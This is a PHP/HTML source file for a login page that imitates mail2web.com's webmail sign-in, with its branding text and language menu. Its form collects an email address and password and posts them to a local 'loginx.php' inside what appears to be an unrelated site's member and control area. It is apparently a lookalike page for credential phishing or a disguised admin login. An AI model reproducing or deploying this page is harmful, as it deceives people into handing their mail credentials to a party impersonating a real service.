<?php
require( "../member/include/config.inc.php" );
$langx = $_REQUEST['langx'];
$str = time( );
$langx = $_REQUEST['langx'];
$uid = $_REQUEST['uid'];
if ( $uid == "" )
{
				$uid = substr( md5( $str ), 0, 14 );
}
if ( $langx == "" )
{
				$langx = "zh-cn";
}

?>
<html>
<head>
<TITLE></TITLE>
<META http-equiv="Content-Type" content="text/html; charset=utf-8">
<link href="/style/control/index.css" rel="stylesheet" type="text/css">
<script language="JavaScript" type="text/JavaScript">
<!--

if (top.location == self.location) {
	top.location="/";
}

function MM_preloadImages() { //v3.0
  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
}

//-->
</script>
<style type="text/css">
<!--
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
.STYLE4 {font-family: Arial, Helvetica, sans-serif}
.STYLE5 {color: #3366cc}
.STYLE6 {color: #3366CC}
-->
</style></head>
<body bgcolor="#ffffff">
 <form name="LoginForm" method="post" action="loginx.php">
<table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0">
  <tr>
    <td align="center" valign="top"><table width="133" height="73" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td><p>&nbsp;</p>
          <p>&nbsp;</p>
          <table width="27" border="0" cellspacing="0" cellpadding="0">
            <tr>
              <td><img src="images/a1.gif" width="450" height="9" /></td>
            </tr>
          </table>
            <table width="450" border="0" cellspacing="0" cellpadding="0">
              <tr>
                <td height="26" align="center" background="images/a2.gif" class="head2">Mobile Email- Pick Up Your Email</td>
              </tr>
            </table>
          <table border="0" cellspacing="0" cellpadding="0">
              <tr>
                <td height="100" align="center" valign="top" background="images/a2.gif"><table width="94%" border="0" cellspacing="0" cellpadding="0">
                    <tr>
                      <td height="18" align="center"><span class="STYLE4">From &nbsp;any&nbsp; computer&nbsp;, &nbsp;anywhere&nbsp; in&nbsp; the&nbsp; world.&nbsp; No&nbsp; need&nbsp; to&nbsp; register&nbsp;!</span></td>
                    </tr>
                  </table>
                    <table width="27" border="0" cellspacing="0" cellpadding="0">
                      <tr>
                        <td height="5"></td>
                      </tr>
                    </table>
                  <table width="358" height="24" border="0" cellpadding="0" cellspacing="0">
                      <tr>
                        <td align="left"><span class="m2wlogin-label">Your Email Address</span></td>
                      </tr>
                  </table>
                  <table width="366" height="24" border="0" cellpadding="0" cellspacing="0">
                      <tr>
                        <td><span >
                          <INPUT ID="username" TYPE=TEXT NAME="username" VALUE=""  class="kk" SIZE=50
						   MAXLENGTH=16>
                        </span></td>
                      </tr>
                  </table>
                  <table width="27" border="0" cellspacing="0" cellpadding="0">
                      <tr>
                        <td height="5"></td>
                      </tr>
                  </table>
                  <table width="359" height="24" border="0" cellpadding="0" cellspacing="0">
                      <tr>
                        <td align="left"><span class="m2wlogin-label">Password</span></td>
                      </tr>
                  </table>
                  <table width="366" height="24" border="0" cellpadding="0" cellspacing="0">
                      <tr>
                        <td><span >
                          <input id="passwd" type=PASSWORD name="passwd" value=""  class="kk"size=50 maxlength=16>
                        </span></td>
                      </tr>
                  </table>
                  <table width="27" border="0" cellspacing="0" cellpadding="0">
                      <tr>
                        <td height="10"></td>
                      </tr>
                  </table>
                  <table width="348" height="24" border="0" cellpadding="0" cellspacing="0">
                      <tr>
                        <td width="181" align="left"><div class="details" style="width:180px; float:left;">Webmail Login</div>
                          <a ></a></td>
                        <td width="185"><div style="width:150px; float:right; text-align:right">
                          <input type="submit" name="Submit2" value="Login Mail" />
                        </div></td>
                      </tr>
                  </table>
                  <table width="27" border="0" cellspacing="0" cellpadding="0">
                      <tr>
                        <td height="15"></td>
                      </tr>
                  </table>
                  <table width="329" height="24" border="0" cellpadding="0" cellspacing="0">
                      <tr>
                        <td width="30%" align="left"><span class="m2wlogin-label">Intellilogin</span></td>
                        <td width="37%" align="left" class="m2wlogin-label STYLE5">Advanced Login</td>
                        <td width="33%" align="right" class="m2wlogin-label STYLE6">Secure Login</td>
                      </tr>
                  </table>
                  <table width="27" border="0" cellspacing="0" cellpadding="0">
                      <tr>
                        <td height="10"></td>
                      </tr>
                  </table>
                  <table width="40%" border="0" cellspacing="0" cellpadding="0">
                      <tr>
                        <td align="center"><form action="/login/" method="post" name="languages" id="languages" style="padding:0; margin:0">
                            <select name="lid" size="1" class="details2" tabindex="6">
                              <option value="2">Chinese</option>
                              <option value="3">Chinese-HK</option>
                              <option value="16">Dutch</option>
                              <option value="0" selected="selected">English</option>
                              <option value="7">French</option>
                              <option value="5">German</option>
                              <option value="13">Hebrew</option>
                              <option value="8">Italian</option>
                              <option value="9">Japanese</option>
                              <option value="10">Korean</option>
                              <option value="12">Polish</option>
                              <option value="11">Portuguese</option>
                              <option value="14">Russian</option>
                              <option value="6">Spanish</option>
                              <option value="15">Swedish</option>
                              <option value="1">Turkish</option>
                            </select>
                            <input name="LangGo" type="button" class="details2" tabindex="7" value="Go" />
                        </form></td>
                      </tr>
                  </table>
                  <table width="270" height="40" border="0" cellpadding="0" cellspacing="0">
                      <tr>
                        <td><div align="center" class="details">Welcome to the updated mail2web.com! <br />
                          Learn more about what’s new.</div></td>
                      </tr>
                  </table></td>
              </tr>
              <tr>
                <td><img src="images/a3.gif" width="450" height="9" /></td>
              </tr>
          </table></td>
      </tr>
    </table></td>
  </tr>
</table>
 </form>
</body>
</html>

